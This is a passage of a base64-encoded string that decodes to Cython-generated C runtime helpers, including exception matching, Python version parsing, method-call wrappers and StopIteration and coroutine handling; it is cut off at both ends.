pYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Jc0FueVN1YnR5cGUyKFB5VHlwZU9iamVjdCAqY2xzLCBQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYikge1xuICAgIFB5T2JqZWN0ICptcm87XG4gICAgaWYgKGNscyA9PSBhIHx8IGNscyA9PSBiKSByZXR1cm4gMTtcbiAgICBtcm8gPSBjbHMtPnRwX21ybztcbiAgICBpZiAobGlrZWx5KG1ybykpIHtcbiAgICAgICAgUHlfc3NpemVfdCBpLCBuO1xuICAgICAgICBuID0gUHlUdXBsZV9HRVRfU0laRShtcm8pO1xuICAgICAgICBmb3IgKGkgPSAwOyBpIDwgbjsgaSsrKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqYmFzZSA9IFB5VHVwbGVfR0VUX0lURU0obXJvLCBpKTtcbiAgICAgICAgICAgIGlmIChiYXNlID09IChQeU9iamVjdCAqKWEgfHwgYmFzZSA9PSAoUHlPYmplY3QgKiliKVxuICAgICAgICAgICAgICAgIHJldHVybiAxO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfSW5CYXNlcyhjbHMsIGEpIHx8IF9fUHl4X0luQmFzZXMoY2xzLCBiKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0KiBleGNfdHlwZTEsIFB5T2JqZWN0ICpleGNfdHlwZTIpIHtcbiAgICBpZiAoZXhjX3R5cGUxKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9Jc0FueVN1YnR5cGUyKChQeVR5cGVPYmplY3QqKWVyciwgKFB5VHlwZU9iamVjdCopZXhjX3R5cGUxLCAoUHlUeXBlT2JqZWN0KilleGNfdHlwZTIpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9Jc1N1YnR5cGUoKFB5VHlwZU9iamVjdCopZXJyLCAoUHlUeXBlT2JqZWN0KilleGNfdHlwZTIpO1xuICAgIH1cbn1cbnN0YXRpYyBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzVHVwbGUoUHlPYmplY3QgKmV4Y190eXBlLCBQeU9iamVjdCAqdHVwbGUpIHtcbiAgICBQeV9zc2l6ZV90IGksIG47XG4gICAgYXNzZXJ0KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXhjX3R5cGUpKTtcbiAgICBuID0gUHlUdXBsZV9HRVRfU0laRSh0dXBsZSk7XG4gICAgZm9yIChpPTA7IGk8bjsgaSsrKSB7XG4gICAgICAgIGlmIChleGNfdHlwZSA9PSBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCBpKSkgcmV0dXJuIDE7XG4gICAgfVxuICAgIGZvciAoaT0wOyBpPG47IGkrKykge1xuICAgICAgICBQeU9iamVjdCAqdCA9IFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIGkpO1xuICAgICAgICBpZiAobGlrZWx5KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2sodCkpKSB7XG4gICAgICAgICAgICBpZiAoX19QeXhfaW5uZXJfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihleGNfdHlwZSwgTlVMTCwgdCkpIHJldHVybiAxO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICB9XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhQeU9iamVjdCAqZXJyLCBQeU9iamVjdCogZXhjX3R5cGUpIHtcbiAgICBpZiAobGlrZWx5KGVyciA9PSBleGNfdHlwZSkpIHJldHVybiAxO1xuICAgIGlmIChsaWtlbHkoUHlFeGNlcHRpb25DbGFzc19DaGVjayhlcnIpKSkge1xuICAgICAgICBpZiAobGlrZWx5KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXhjX3R5cGUpKSkge1xuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X2lubmVyX1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoZXJyLCBOVUxMLCBleGNfdHlwZSk7XG4gICAgICAgIH0gZWxzZSBpZiAobGlrZWx5KFB5VHVwbGVfQ2hlY2soZXhjX3R5cGUpKSkge1xuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlc1R1cGxlKGVyciwgZXhjX3R5cGUpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICB9XG4gICAgfVxuICAgIHJldHVybiBQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCBleGNfdHlwZSk7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihQeU9iamVjdCAqZXJyLCBQeU9iamVjdCAqZXhjX3R5cGUxLCBQeU9iamVjdCAqZXhjX3R5cGUyKSB7XG4gICAgYXNzZXJ0KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXhjX3R5cGUxKSk7XG4gICAgYXNzZXJ0KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXhjX3R5cGUyKSk7XG4gICAgaWYgKGxpa2VseShlcnIgPT0gZXhjX3R5cGUxIHx8IGVyciA9PSBleGNfdHlwZTIpKSByZXR1cm4gMTtcbiAgICBpZiAobGlrZWx5KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXJyKSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X2lubmVyX1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoZXJyLCBleGNfdHlwZTEsIGV4Y190eXBlMik7XG4gICAgfVxuICAgIHJldHVybiAoUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUxKSB8fCBQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCBleGNfdHlwZTIpKTtcbn1cbiNlbmRpZlxuXG5cbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBiMDAwMFxudm9pZCBfX1B5eF9pbml0X3J1bnRpbWVfdmVyc2lvbih2b2lkKSB7XG4gICAgaWYgKF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPT0gMCkge1xuICAgICAgICBjb25zdCBjaGFyKiBydF92ZXJzaW9uID0gUHlfR2V0VmVyc2lvbigpO1xuICAgICAgICB1bnNpZ25lZCBsb25nIHZlcnNpb24gPSAwO1xuICAgICAgICB1bnNpZ25lZCBsb25nIGZhY3RvciA9IDB4MDEwMDAwMDBVTDtcbiAgICAgICAgdW5zaWduZWQgaW50IGRpZ2l0ID0gMDtcbiAgICAgICAgaW50IGkgPSAwO1xuICAgICAgICB3aGlsZSAoZmFjdG9yKSB7XG4gICAgICAgICAgICB3aGlsZSAoXCcwXCcgPD0gcnRfdmVyc2lvbltpXSAmJiBydF92ZXJzaW9uW2ldIDw9IFwnOVwnKSB7XG4gICAgICAgICAgICAgICAgZGlnaXQgPSBkaWdpdCAqIDEwICsgKHVuc2lnbmVkIGludCkgKHJ0X3ZlcnNpb25baV0gLSBcJzBcJyk7XG4gICAgICAgICAgICAgICAgKytpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdmVyc2lvbiArPSBmYWN0b3IgKiBkaWdpdDtcbiAgICAgICAgICAgIGlmIChydF92ZXJzaW9uW2ldICE9IFwnLlwnKVxuICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgZGlnaXQgPSAwO1xuICAgICAgICAgICAgZmFjdG9yID4+PSA4O1xuICAgICAgICAgICAgKytpO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPSB2ZXJzaW9uO1xuICAgIH1cbn1cbiNlbmRpZlxuc3RhdGljIHVuc2lnbmVkIGxvbmcgX19QeXhfZ2V0X3J1bnRpbWVfdmVyc2lvbih2b2lkKSB7XG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMDAwXG4gICAgcmV0dXJuIFB5X1ZlcnNpb24gJiB+MHhGRlVMO1xuI2Vsc2VcbiAgICByZXR1cm4gX19QeXhfY2FjaGVkX3J1bnRpbWVfdmVyc2lvbjtcbiNlbmRpZlxufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUEkodm9pZCkge1xuICAgIGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSV9jYWNoZSkpXG4gICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUElfY2FjaGUgPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmV4dCk7XG4gICAgcmV0dXJuIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUElfY2FjaGU7XG59XG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbihQeU9iamVjdCAqaXRlcmF0b3IpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwXG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBQeU9iamVjdCAqbmV4dCA9IF9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUEkoKTtcbiAgICBpZiAodW5saWtlbHkoIW5leHQpKSByZXR1cm4gTlVMTDtcbiAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb25PYmpBcmdzKG5leHQsIGl0ZXJhdG9yLCBOVUxMKTtcbiAgICByZXR1cm4gcmVzdWx0O1xuI2Vsc2VcbiAgICAodm9pZClfX1B5eF9HZXRCdWlsdGluTmFtZTsgLy8gb25seSBmb3IgZWFybHkgbGltaXRlZCBBUElcbiAgICBpdGVybmV4dGZ1bmMgaXRlcm5leHQgPSBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoaXRlcmF0b3IpO1xuICAgIGFzc2VydChpdGVybmV4dCk7XG4gICAgcmV0dXJuIGl0ZXJuZXh0KGl0ZXJhdG9yKTtcbiNlbmRpZlxufVxuXG5cbiNpZiAhKENZVEhPTl9WRUNUT1JDQUxMICYmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDApKSlcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfX1B5T2JqZWN0X0NhbGxNZXRob2QxKFB5T2JqZWN0KiBtZXRob2QsIFB5T2JqZWN0KiBhcmcpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhtZXRob2QsIGFyZyk7XG4gICAgUHlfREVDUkVGKG1ldGhvZCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMShQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUsIFB5T2JqZWN0KiBhcmcpIHtcbiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwKSlcbiAgICBQeU9iamVjdCAqYXJnc1syXSA9IHtvYmosIGFyZ307XG4gICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmc7XG4gICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJncztcbiAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbE1ldGhvZChtZXRob2RfbmFtZSwgYXJncywgMiB8IFBZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwgTlVMTCk7XG4jZWxzZVxuICAgIFB5T2JqZWN0ICptZXRob2QgPSBOVUxMLCAqcmVzdWx0O1xuICAgIGludCBpc19tZXRob2QgPSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Qob2JqLCBtZXRob2RfbmFtZSwgJm1ldGhvZCk7XG4gICAgaWYgKGxpa2VseShpc19tZXRob2QpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJncyhtZXRob2QsIG9iaiwgYXJnKTtcbiAgICAgICAgUHlfREVDUkVGKG1ldGhvZCk7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSghbWV0aG9kKSkgcmV0dXJuIE5VTEw7XG4gICAgcmV0dXJuIF9fUHl4X19QeU9iamVjdF9DYWxsTWV0aG9kMShtZXRob2QsIGFyZyk7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9fUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24oUHlPYmplY3QqIHZhbHVlLCBpbnQgYXN5bmMpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYywgaW50IGl0ZXJuZXh0KSB7XG4gICAgaWYgKHZhbHVlID09IFB5X05vbmUpIHtcbiAgICAgICAgaWYgKGFzeW5jIHx8ICFpdGVybmV4dClcbiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoYXN5bmMgPyBQeUV4Y19TdG9wQXN5bmNJdGVyYXRpb24gOiBQeUV4Y19TdG9wSXRlcmF0aW9uKTtcbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBfX1B5eF9fUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24odmFsdWUsIGFzeW5jKTtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X19SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYykge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuI2VuZGlmXG4gICAgUHlPYmplY3QgKmV4YztcbiAgICBQeU9iamVjdCAqZXhjX3R5cGUgPSBhc3luYyA/IFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbiA6IFB5RXhjX1N0b3BJdGVyYXRpb247XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgaWYgKChQWV9WRVJTSU9OX0hFWCA+PSAoMHgwMzBDMDBBNikpIHx8IHVubGlrZWx5KFB5VHVwbGVfQ2hlY2sodmFsdWUpIHx8IFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBpZiAoUFlfVkVSU0lPTl9IRVggPj0gKDB4MDMwZTAwQTEpKSB7XG4gICAgICAgICAgICBleGMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGV4Y190eXBlLCB2YWx1ZSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqYXJnc190dXBsZSA9IFB5VHVwbGVfTmV3KDEpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFhcmdzX3R1cGxlKSkgcmV0dXJuO1xuICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJnc190dXBsZSwgMCwgdmFsdWUpO1xuICAgICAgICAgICAgZXhjID0gUHlPYmplY3RfQ2FsbChleGNfdHlwZSwgYXJnc190dXBsZSwgTlVMTCk7XG4gICAgICAgICAgICBQeV9ERUNSRUYoYXJnc190dXBsZSk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHVubGlrZWx5KCFleGMpKSByZXR1cm47XG4gICAgfSBlbHNlIHtcbiAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgZXhjID0gdmFsdWU7XG4gICAgfVxuICAgICNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgaWYgKCFfX3B5eF90c3RhdGUtPmV4Y19pbmZvLT5leGNfdmFsdWUpXG4gICAgI2Vsc2VcbiAgICBpZiAoIV9fcHl4X3RzdGF0ZS0+ZXhjX3R5cGUpXG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgICBQeV9JTkNSRUYoZXhjX3R5cGUpO1xuICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKGV4Y190eXBlLCBleGMsIE5VTEwpO1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgICNlbmRpZlxuI2Vsc2VcbiAgICBleGMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGV4Y190eXBlLCB2YWx1ZSk7XG4gICAgaWYgKHVubGlrZWx5KCFleGMpKSByZXR1cm47XG4jZW5kaWZcbiAgICBQeUVycl9TZXRPYmplY3QoZXhjX3R5cGUsIGV4Yyk7XG4gICAgUHlfREVDUkVGKGV4Yyk7XG59XG5cblxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4jaW5jbHVkZSA8ZnJhbWVvYmplY3QuaD5cbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMGE2ICYmICFkZWZpbmVkKFBZUFlfVkVSU0lPTilcbiAgI2lmbmRlZiBQeV9CVUlMRF9DT1JFXG4gICAgI2RlZmluZSBQeV9CVUlMRF9DT1JFIDFcbiAgI2VuZGlmXG4gICNpbmNsdWRlICJpbnRlcm5hbC9weWNvcmVfZnJhbWUuaCJcbiNlbmRpZlxuI2VuZGlmIC8vIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWRcbl9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7XG4jaWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCA9IE5VTEw7XG4jZW5kaWZcbiAgICBQeV9DTEVBUihnZW4tPnlpZWxkZnJvbSk7XG59XG5zdGF0aWMgaW50IF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICoqcHZhbHVlKSB7XG4gICAgUHlPYmplY3QgKmV0LCAqZXYsICp0YjtcbiAgICBQeU9iamVjdCAqdmFsdWUgPSBOVUxMO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X3RzdGF0ZSk7XG4gICAgX19QeXhfRXJyRmV0Y2goJmV0LCAmZXYsICZ0Yik7XG4gICAgaWYgKCFldCkge1xuICAgICAgICBQeV9YREVDUkVGKHRiKTtcbiAgICAgICAgUHlfWERFQ1JFRihldik7XG4gICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTtcbiAgICAgICAgKnB2YWx1ZSA9IFB5X05vbmU7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICBpZiAobGlrZWx5KGV0ID09IFB5RXhjX1N0b3BJdGVyYXRpb24pKSB7XG4gICAgICAgIGlmICghZXYpIHtcbiAgICAgICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTtcbiAgICAgICAgICAgIHZhbHVlID0gUHlfTm9uZTtcbiAgICAgICAgfVxuICAgICAgICBlbHNlIGlmIChsaWtlbHkoX19QeXhfSVNfVFlQRShldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7XG4gICAgICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICAgICAgICAgICB2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHIoZXYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YWx1ZSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkgZ290byBsaW1pdGVkX2FwaV9mYWlsdXJlO1xuICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIHZhbHVlID0gKChQeVN0b3BJdGVyYXRpb25PYmplY3QgKilldiktPnZhbHVlO1xuICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgUHlfREVDUkVGKGV2KTtcbiAgICAgICAgfVxuICAgICAgICBlbHNlIGlmICh1bmxpa2VseShQeVR1cGxlX0NoZWNrKGV2KSkpIHtcbiAgICAgICAgICAgIFB5X3NzaXplX3QgdHVwbGVfc2l6ZSA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoZXYpO1xuICAgICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHR1cGxlX3NpemUgPCAwKSkge1xuICAgICAgICAgICAgICAgIFB5X1hERUNSRUYodGIpO1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihldik7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGV0KTtcbiAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgIGlmICh0dXBsZV9zaXplID49IDEpIHtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgICAgIHZhbHVlID0gUHlUdXBsZV9HRVRfSVRFTShldiwgMCk7XG4gICAgICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiNlbGlmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgICAgICAgICB2YWx1ZSA9IFB5U2VxdWVuY2VfSVRFTShldiwgMCk7XG4jZWxzZVxuICAgICAgICAgICAgICAgIHZhbHVlID0gUHlTZXF1ZW5jZV9HZXRJdGVtKGV2LCAwKTtcbiAgICAgICAgICAgICAgICBpZiAoIXZhbHVlKSBnb3RvIGxpbWl0ZWRfYXBpX2ZhaWx1cmU7XG4jZW5kaWZcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpO1xuICAgICAgICAgICAgICAgIHZhbHVlID0gUHlfTm9uZTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIFB5X0RFQ1JFRihldik7XG4gICAgICAgIH1cbiAgICAgICAgZWxzZSBpZiAoIV9fUHl4X1R5cGVDaGVjayhldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpIHtcbiAgICAgICAgICAgIHZhbHVlID0gZXY7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGxpa2VseSh2YWx1ZSkpIHtcbiAgICAgICAgICAgIFB5X1hERUNSRUYodGIpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGV0KTtcbiAgICAgICAgICAgICpwdmFsdWUgPSB2YWx1ZTtcbiAgICAgICAgICAgIHJldHVybiAwO1xuICAgICAgICB9XG4gICAgfSBlbHNlIGlmICghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV0LCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkge1xuICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKGV0LCBldiwgdGIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5RXJyX05vcm1hbGl6ZUV4Y2VwdGlvbigmZXQsICZldiwgJnRiKTtcbiAgICBpZiAodW5saWtlbHkoIVB5T2JqZWN0X1R5cGVDaGVjayhldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7XG4gICAgICAgIF9fUHl4X0VyclJlc3RvcmUoZXQsIGV2LCB0Yik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfWERFQ1JFRih0Yik7XG4gICAgUHlfREVDUkVGKGV0KTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgdmFsdWUgPSBQeU9iamVjdF9HZXRBdHRyKGV2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdmFsdWUpO1xuI2Vsc2VcbiAgICB2YWx1ZSA9ICgoUHlTdG9wSXRlcmF0aW9uT2JqZWN0ICopZXYpLT52YWx1ZTtcbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuI2VuZGlmXG4gICAgUHlfREVDUkVGKGV2KTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIHJldHVybiAtMTtcbiNlbmRpZlxuICAgICpwdmFsdWUgPSB2YWx1ZTtcbiAgICByZXR1cm4gMDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgfHwgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgbGltaXRlZF9hcGlfZmFpbHVyZTpcbiAgICBQeV9YREVDUkVGKGV0KTtcbiAgICBQeV9YREVDUkVGKHRiKTtcbiAgICBQeV9YREVDUkVGKGV2KTtcbiAgICByZXR1cm4gLTE7XG4jZW5kaWZcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FXG5fX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX3N0YXR1c19mcm9tX3Jlc3VsdChQeU9iamVjdCAqKnJldHZhbCkge1xuICAgIGlmICgqcmV0dmFsKSB7XG4gICAgICAgIHJldHVybiBQWUdFTl9ORVhUO1xuICAgIH0gZWxzZSBpZiAobGlrZWx5KF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsIHJldHZhbCkgPT0gMCkpIHtcbiAgICAgICAgcmV0dXJuIFBZR0VOX1JFVFVSTjtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7XG4gICAgfVxufVxuc3RhdGljIENZVEhPTl9JTkxJTkVcbnZvaWQgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKmV4Y19zdGF0ZSkge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTRcbiAgICBQeV9DTEVBUihleGNfc3RhdGUtPmV4Y192YWx1ZSk7XG4jZWxzZVxuICAgIFB5T2JqZWN0ICp0LCAqdiwgKnRiO1xuICAgIHQgPSBleGNfc3RhdGUtPmV4Y190eXBlO1xuICAgIHYgPSBleGNfc3RhdGUtPmV4Y192YWx1ZTtcbiAgICB0YiA9IGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjaztcbiAgICBleGNfc3RhdGUtPmV4Y190eXBlID0gTlVMTDtcbiAgICBleGNfc3RhdGUtPmV4Y192YWx1ZSA9IE5VTEw7XG4gICAgZXhjX3N0YXRlLT5leGNfdHJhY2ViYWNrID0gTlVMTDtcbiAgICBQeV9YREVDUkVGKHQpO1xuICAgIFB5X1hERUNSRUYodik7XG4gICAgUHlfWERFQ1JFRih0Yik7XG4jZW5kaWZcbn1cbiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKSAgKF9fUHl4X19Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pLCAoUHlPYmplY3QqKU5VTEwpXG5zdGF0aWMgdm9pZCBfX1B5eF9fQ29yb3V0aW5lX0FscmVhZHlSdW5uaW